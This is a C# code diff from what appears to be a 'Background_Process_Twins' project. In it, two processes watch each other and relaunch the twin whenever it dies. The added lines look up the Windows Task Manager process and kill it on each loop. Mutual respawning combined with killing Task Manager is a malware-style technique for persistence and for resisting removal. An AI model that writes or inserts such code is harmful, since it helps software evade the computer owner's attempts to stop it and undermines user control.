@@ -20,10 +20,20 @@ namespace Background_Process_Twins
                 Thread.Sleep(5000);
                 if (main_program.check_processes() == false)
                 {
-                    Console.WriteLine("[*] Twin Process Not Alive");
+                    Console.WriteLine("[*] Twin Process Dead [2]");
                     main_program.execute_twin_process();
                 }
-                Console.WriteLine("[*] END");
+                try
+                {
+                    Process[] proc = Process.GetProcessesByName("Taskmgr");
+                    Console.WriteLine(proc[0]);
+                    proc[0].Kill();
+                }
+                catch(Exception ex)
+                {
+                    Console.WriteLine(ex);
+                }
+           
             }
         }
         // Currently polling. (Bad).
@@ -33,9 +43,9 @@ namespace Background_Process_Twins
             bool process_alive = false;
             for (int i = 0; i <= allProcesses.Length - 1; i++)
             {
-                Console.WriteLine(allProcesses[i].ToString().Substring(27));
                 if (allProcesses[i].ToString().Contains("Background_Process_Twin_2"))
                 {
+                    Console.WriteLine(allProcesses[i].ToString().Substring(27));
                     Console.WriteLine("[*] Twin Process Is Alive [2]");
                     process_alive = true;
                     break;
